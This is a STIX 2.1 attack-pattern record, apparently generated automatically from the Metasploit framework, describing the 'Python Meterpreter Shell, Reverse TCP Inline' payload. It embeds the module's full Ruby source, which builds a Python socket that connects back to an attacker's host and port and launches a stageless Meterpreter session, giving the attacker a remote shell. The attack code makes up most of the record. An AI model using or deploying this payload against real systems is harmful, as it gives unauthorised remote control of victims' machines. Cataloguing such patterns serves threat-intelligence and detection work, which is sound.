{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b2f0d7da-35af-4a9a-9b21-4ec444b12c2f",
    "created": "2024-08-14T16:33:19.396062Z",
    "modified": "2024-08-14T16:33:19.396066Z",
    "name": "Python Meterpreter Shell, Reverse TCP Inline",
    "description": "Connect back to the attacker and spawn a Meterpreter shell",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/python/meterpreter_reverse_tcp.rb",
            "external_id": "meterpreter_reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = :dynamic\n\n  include Msf::Payload::Single\n  include Msf::Payload::Python\n  include Msf::Payload::Python::ReverseTcp\n  include Msf::Payload::Python::MeterpreterLoader\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'        => 'Python Meterpreter Shell, Reverse TCP Inline',\n      'Description' => 'Connect back to the attacker and spawn a Meterpreter shell',\n      'Author'      => 'Spencer McIntyre',\n      'License'     => MSF_LICENSE,\n      'Platform'    => 'python',\n      'Arch'        => ARCH_PYTHON,\n      'Handler'     => Msf::Handler::ReverseTcp,\n      'Session'     => Msf::Sessions::Meterpreter_Python_Python\n    ))\n  end\n\n  def generate_reverse_tcp(opts={})\n    socket_setup  = \"s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\n\"\n    socket_setup << \"s.connect(('#{opts[:host]}',#{opts[:port]}))\\n\"\n    opts[:stageless_tcp_socket_setup] = socket_setup\n    opts[:stageless] = true\n\n    met = stage_meterpreter(opts)\n    py_create_exec_stub(met)\n  end\nend\n",
    "x_mitre_platforms": [
        "python'"
    ]
}